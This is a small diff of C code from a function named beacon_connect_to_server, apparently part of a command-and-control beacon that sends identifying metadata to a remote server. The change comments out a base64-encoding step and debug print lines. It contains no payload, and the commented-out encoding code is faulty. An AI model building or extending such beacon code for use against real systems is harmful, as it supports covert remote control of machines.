@@ -93,18 +93,18 @@ void beacon_connect_to_server(char IP[16], int PORT){
     char recvbuf[recvbuflen];
 
     // base64 encode the UUID of the beacon
-    char b64size[8];
-    DWORD strcount;
-    char *UUID_BUFFER;
-    BOOL res = CryptBinaryToStringA(sendbuf, 8, 1, UUID_BUFFER, &strcount);
-    printf("\nBASE64\n");
+    //char b64size[8];
+    //DWORD strcount;
+    //char *UUID_BUFFER;
+    //BOOL res = CryptBinaryToStringA(sendbuf, 8, 1, UUID_BUFFER, &strcount);
+    //printf("\nBASE64\n");
     
     //printf("\n%s\n", &uuid);
 
     //// Send metadata
-    printf("\nSENDBUF\n");
-    printf("\n%s\n", &UUID_BUFFER);
-    printf("\nSENDBUF2\n");
+    //printf("\nSENDBUF\n");
+    //printf("\n%s\n", &UUID_BUFFER);
+    //printf("\nSENDBUF2\n");
     send_all(s, sendbuf, (int)strlen(sendbuf)); 
   
     
